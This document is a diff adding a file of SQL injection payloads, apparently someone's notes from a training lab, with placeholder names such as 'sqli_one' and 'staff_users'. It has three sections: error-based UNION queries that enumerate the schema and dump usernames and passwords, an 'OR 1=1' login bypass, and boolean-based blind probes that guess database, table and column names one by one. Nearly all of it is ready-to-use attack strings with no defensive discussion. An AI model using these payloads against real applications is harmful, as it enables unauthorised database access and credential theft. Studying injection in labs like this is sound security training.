@@ -1,0 +1,34 @@
+Type 1 Error Base SQLi
+
+UNION select 1,2,3;
+---
+UNION select 1,2,database();
+---
+UNION select 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one';
+---
+UNION select 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users';
+---
+UNION select 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users;
+---
+---
+Type 2 Blind SQLi
+
+SELECT * from users where username='%username%' and password='%password%' LIMIT 1;
+---
+SELECT * from users where username='admin' and password='' OR 1=1;--
+---
+---
+Type 3 Boolean Based Blind SQLi
+
+user' UNION SELECT 1,2,3;--
+---
+user' UNION SELECT 1,2,3 where database() like 's%';--
+user' UNION SELECT 1,2,3 where database() like '%sqli_three%';--
+---
+user' UNION SELECT 1,2,3 From information_schema.tables where table_schema = 'sqli_three' and table_name like '%users%';---
+---
+user' UNION SELECT 1,2,3 From information_schema.tables where table_schema = 'sqli_three' and table_name='users' and Column_name like '%username%';---
+---
+user' UNION SELECT 1,2,3 From information_schema.tables where table_schema = 'sqli_three' and table_name='users' and Column_name like '%password%';---
+---
+user' UNION SELECT 1,2,3 From users where username like '%admin%';--
